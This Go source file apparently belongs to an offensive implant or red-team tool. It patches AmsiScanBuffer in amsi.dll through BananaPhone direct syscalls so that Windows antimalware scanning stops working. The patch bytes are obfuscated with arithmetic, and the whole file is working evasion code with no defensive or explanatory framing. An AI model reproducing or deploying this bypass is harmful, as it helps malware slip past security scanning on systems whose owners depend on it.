package core

/*

References:
https://github.com/Ne0nd0g/merlin-agent/blob/master/os/windows/pkg/evasion/evasion.go
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

*/

import (
  "fmt"
  "unsafe"
  "syscall"

  bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}

func PatchAmsi() (error) {
  err := WriteBanana("amsi.dll", "AmsiScanBuffer", &amsi_patch)
  if err != nil {
    return err
  }

  return nil
}

func WriteBanana(module string, proc string, data *[]byte) error {
  target := syscall.NewLazyDLL(module).NewProc(proc)
  err := target.Find()
  if err != nil {
    return err
  }
  
  banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
  if err != nil {
    return err
  }
	
  ZwWriteVirtualMemory, err := banana.GetSysID("ZwWriteVirtualMemory")
	if err != nil {
    return err
  }

  NtProtectVirtualMemory, err := banana.GetSysID("NtProtectVirtualMemory")
  if err != nil {
    return err
  }

  baseAddress := target.Addr()
  numberOfBytesToProtect := uintptr(len(*data))
  var oldProtect uint32

  ret, err := bananaphone.Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    syscall.PAGE_EXECUTE_READWRITE,
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = bananaphone.Syscall(
    ZwWriteVirtualMemory,
    uintptr(0xffffffffffffffff),
    target.Addr(),
    uintptr(unsafe.Pointer(&[]byte(*data)[0])),
    unsafe.Sizeof(*data),
    0,
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = bananaphone.Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    uintptr(oldProtect),
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }
	
  return nil
}


